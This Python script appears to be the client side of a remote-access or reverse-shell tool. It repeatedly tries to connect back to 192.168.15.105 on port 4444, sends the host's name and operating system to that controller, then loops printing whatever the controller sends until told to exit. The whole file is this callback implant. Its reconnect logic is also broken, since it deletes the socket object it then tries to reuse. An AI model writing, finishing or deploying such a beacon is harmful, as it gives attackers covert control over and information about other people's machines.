import socket, os, sys, platform, time



host = "192.168.15.105"
port = 4444
buffer_size = 1024

s = socket.socket()

def server_connect():
    while True:
        try:
            s.connect((host, port))
        except socket.error:
            time.sleep(5)
        else: break
    
    userInfo = socket.gethostname() + "'," + platform.system() + " " + platform.release()
    send_data(str.encode(userInfo))

def decode_utf8(data):
    return data.decode("utf-8")
def receive_data(buffer):
    return s.recv(buffer)
def send_data(data):
    s.send(data)

server_connect()

while True:
    try:
        while True:
            data = receive_data(buffer_size)
            data = decode_utf8(data)
            if data == "exit":
                s.close()
                sys.exit(0)
            else:
                print(data)
    except socket.error:
        s.close()
        del s
        server_connect()